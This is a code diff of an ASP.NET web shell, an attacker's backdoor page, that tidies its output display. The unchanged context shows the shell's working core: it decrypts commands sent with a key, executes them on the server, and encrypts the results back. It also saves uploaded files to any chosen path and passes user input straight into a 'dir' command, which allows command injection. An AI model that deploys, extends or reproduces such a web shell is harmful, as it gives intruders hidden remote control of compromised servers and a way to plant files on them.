@@ -18,7 +18,7 @@ Functions of the shell:
         if(!String.IsNullOrEmpty(cmd))
         {
             result = encrypt(ExcuteCmd(decrypt(cmd, key)), key);
-        }        
+        }
         Response.Write(result);
     }
 
@@ -90,13 +90,14 @@ Functions of the shell:
                 // Get directory to save file
                 // If directory doesn't exist, try to create
                 // Fail -> get current dir
-                save_name = @FileLocation.Text;
+                save_name = @FileLocation.Text.Replace("\"","") + "\\";
                 if (!Directory.Exists(save_name))
                 {
                     if(!String.IsNullOrEmpty(save_name))
                     {
                         try
                         {
+
                             Directory.CreateDirectory(save_name);
                         }
                         catch (Exception ex)
@@ -108,18 +109,17 @@ Functions of the shell:
                         save_name = Directory.GetCurrentDirectory() + "\\";
                         mess.Append("<br/>Save to current directory: " + save_name);
                     }
-
                 }
 
-                save_name += Server.HtmlEncode(FileUpload1.FileName);
+                save_name += htmlEncode(FileUpload1.FileName);
                 FileUpload1.SaveAs(save_name);
-                mess.Append("<br/>Upload successfully to " + save_name);
+                mess.Append("<br/>Upload successfully. Path to file: " + save_name);
 
             } catch (Exception ex)
             {
                 mess.Append("<br/>Fail upload file: " + ex.Message);
             }
-            UploadStatusLabel.Text = Server.HtmlEncode(mess.ToString());
+            ResultLabel.InnerHtml = htmlEncode(mess.ToString());
         }
 
     }
@@ -127,8 +127,14 @@ Functions of the shell:
     protected void btnscan_Click(object sender, EventArgs e)
     {
         String s = ExcuteCmd("dir " + @FileLocation.Text);
-        UploadStatusLabel.Text = Server.HtmlEncode(s);
+        ResultLabel.InnerHtml = htmlEncode(s);
     }
+
+    protected string htmlEncode(string output)
+    {
+        return Server.HtmlEncode(output.Replace("\n", "<br/>")).Replace("&lt;br/&gt;", "<br/>");
+    }
+
 
 </script>
 <html>
@@ -143,8 +149,9 @@ Functions of the shell:
             <asp:Button ID="btnscan" runat="server" onclick="btnscan_Click" 
                 Text="Scan Given Directory" Width="204px" /> <br />
             <br /><br />
-        <asp:Label Text="Scan Result" runat="server" /><br />   
-        <asp:TextBox TextMode="Multiline" Width="40%" Height="60%" Wrap="True"  id="UploadStatusLabel" runat="server"/>
+        </div>
+        <h3>Result</h3>
+        <div id="ResultLabel" runat="server" style="width:40%; height:60%">
         </div>
         
     </form>
